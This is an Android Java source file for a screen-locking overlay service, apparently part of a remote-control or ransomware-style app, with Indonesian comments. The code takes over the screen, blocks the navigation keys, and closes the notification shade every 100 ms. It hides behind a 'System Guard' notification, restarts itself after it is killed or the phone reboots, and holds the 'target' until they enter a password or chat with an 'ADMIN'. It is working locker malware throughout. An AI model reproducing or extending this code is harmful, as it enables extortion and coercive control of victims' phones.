package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;

public class LockService extends Service {

    private WindowManager windowManager;
    private View lockView;
    private WindowManager.LayoutParams params;
    private String currentPassword = "123";
    private final Handler handler = new Handler();
    private boolean isLocked = false;
    private static final String CHANNEL_ID = "lock_service_notif";

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        // FIXED: Wajib menjalankan Foreground untuk Overlay Service di API 34+
        startLockForeground();
    }

    private void startLockForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Security System", NotificationManager.IMPORTANCE_MIN);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Guard")
                .setContentText("Security overlay active")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        startForeground(102, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;

        String mode = intent.getStringExtra("mode"); 
        String message = intent.getStringExtra("message");
        String updatedPass = intent.getStringExtra("password");

        // Save State ke SharedPreferences agar RestarterReceiver bisa mengambil data ini saat HP reboot
        SharedPreferences.Editor editor = getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit();
        if (mode != null) editor.putString("last_lock_mode", mode);
        if (message != null) editor.putString("last_lock_msg", message);
        if (updatedPass != null) {
            this.currentPassword = updatedPass;
            editor.putString("last_lock_pass", updatedPass);
        }
        editor.apply();

        deployLock(mode, message);
        return START_STICKY;
    }

    private void deployLock(String mode, String message) {
        if (windowManager == null) windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (lockView != null) {
            try { windowManager.removeView(lockView); } catch (Exception e) {}
        }

        int windowFlags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                          WindowManager.LayoutParams.FLAG_FULLSCREEN |
                          WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | // Temporary to allow UI creation
                          WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                          WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                          WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? 
                   WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
                   WindowManager.LayoutParams.TYPE_PHONE;

        params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                windowFlags,
                PixelFormat.TRANSLUCENT);
        
        params.gravity = Gravity.CENTER;
        
        // FIXED: Mematikan kemampuan user untuk menekan tombol Back/Recent melalui Window Flags
        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;

        LayoutInflater inflater = LayoutInflater.from(this);
        try {
            if ("CHAT".equals(mode)) {
                lockView = inflater.inflate(R.layout.type_chat_lock, null);
                initChatMode(message);
            } else {
                lockView = inflater.inflate(R.layout.type_normal_lock, null);
                initNormalMode(message);
            }

            // Disable Soft Navigation Bar Interruption
            lockView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | 
                                         View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | 
                                         View.SYSTEM_UI_FLAG_FULLSCREEN);

            windowManager.addView(lockView, params);
            
            if (!isLocked) {
                startSystemUiKiller();
                isLocked = true;
            }
        } catch (Exception e) {
            stopSelf();
        }
    }

    private void initNormalMode(String msg) {
        TextView tvWarning = lockView.findViewById(R.id.admin_warning_text);
        EditText etPass = lockView.findViewById(R.id.input_key);
        Button btnUnlock = lockView.findViewById(R.id.btn_unlock);

        if (msg != null) tvWarning.setText(msg);

        btnUnlock.setOnClickListener(v -> {
            if (etPass.getText().toString().equals(currentPassword)) {
                terminateLock();
            } else {
                Toast.makeText(this, "ACCESS DENIED", Toast.LENGTH_SHORT).show();
                Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (vibrator != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else { vibrator.vibrate(500); }
                }
            }
        });
    }

    private void initChatMode(String initialMsg) {
        EditText input = lockView.findViewById(R.id.target_message_input);
        View btnSend = lockView.findViewById(R.id.btn_send_reply);
        addChatMessage("ADMIN", initialMsg, true);

        btnSend.setOnClickListener(v -> {
            String text = input.getText().toString().trim();
            if (!text.isEmpty()) {
                addChatMessage("YOU", text, false);
                MainActivity.sendReplyToFlutter(text); 
                input.setText("");
            }
        });
    }

    private void addChatMessage(String sender, String message, boolean isAdmin) {
        LinearLayout chatContainer = lockView.findViewById(R.id.chat_container);
        if (chatContainer == null) return;

        TextView msgBubble = new TextView(this);
        msgBubble.setText("[" + sender + "]: " + message);
        msgBubble.setTextColor(isAdmin ? Color.RED : Color.GREEN);
        msgBubble.setPadding(15, 8, 15, 8);
        msgBubble.setTextSize(14);
        msgBubble.setTypeface(Typeface.MONOSPACE);

        chatContainer.addView(msgBubble);
        ScrollView scroll = lockView.findViewById(R.id.chat_scroll);
        if (scroll != null) scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
    }

    private void startSystemUiKiller() {
        // Mencegah target menarik Notification Bar ke bawah
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
                if (isLocked) handler.postDelayed(this, 100);
            }
        }, 100);
    }

    private void terminateLock() {
        if (lockView != null && windowManager != null) {
            windowManager.removeView(lockView);
            lockView = null;
        }
        isLocked = false;
        handler.removeCallbacksAndMessages(null);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        if (isLocked) {
            // Sinyal kematian paksa ke RestarterReceiver
            Intent broadcastIntent = new Intent("com.nullx.pp.RESTART_LOCK_SERVICE");
            sendBroadcast(broadcastIntent);
        }
        super.onDestroy();
    }
}